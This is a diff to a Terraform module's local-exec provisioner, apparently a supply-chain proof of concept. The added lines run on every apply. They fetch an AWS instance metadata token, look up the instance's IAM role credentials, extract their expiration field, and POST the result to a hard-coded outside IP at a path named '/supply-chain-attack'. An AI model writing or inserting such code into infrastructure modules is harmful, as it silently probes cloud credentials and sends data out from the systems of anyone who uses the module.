@@ -17,11 +17,21 @@ resource "null_resource" "egress_signal" {
     interpreter = ["/bin/sh", "-c"]
     command = <<-EOT
       echo "[POC] Running module from remote source"
+      TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+      ROLE=`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials`
+      
+      if [ -z "$ROLE" ]; then
+        RESULT="no role found"
+      else
+        RESULT=`curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
+          | grep -o '"Expiration"[^,}]*'`
+      fi
 
-      TEST_ID="${var.run_label}-$(date +%s)"
 
-      curl -fsS "http://34.238.194.120/poc?test_id=$${TEST_ID}" \
-        -H "User-Agent: terraform-module-poc/1.0" || true
+      curl -X POST "http://34.238.194.120/supply-chain-attack" -H "Content-Type: application/json" -d $RESULT
+
+
+   
 
       echo "[POC] Done"
     EOT
